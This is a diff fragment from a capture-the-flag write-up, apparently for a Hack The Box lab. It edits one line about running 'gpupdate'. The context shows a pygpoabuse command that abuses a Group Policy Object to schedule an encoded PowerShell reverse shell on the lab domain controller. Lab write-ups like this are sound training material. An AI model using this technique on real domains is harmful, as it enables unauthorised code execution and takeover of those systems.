@@ -388,7 +388,7 @@ Grab the GPO id because we need it for [pyGPOAbuse](https://github.com/Hackndo/p
  pygpoabuse -k frizz.htb/M.SchoolBus@frizzdc.frizz.htb -gpo-id '<GPO_ID>' -ccache M.SchoolBus.ccache -dc-ip frizzdc.frizz.htb -powershell -command "powershell -e <base64_revshell>" -taskname "yolo" -description "yolo"
 ```
 
-Then, update the GPO using `gpupdate` command and you should have a reverse shell.
+Then, update the GPO using `gpupdate` or `gpupdate /force` command and you should have a reverse shell.
 
 # Shell as nt authority\system
 
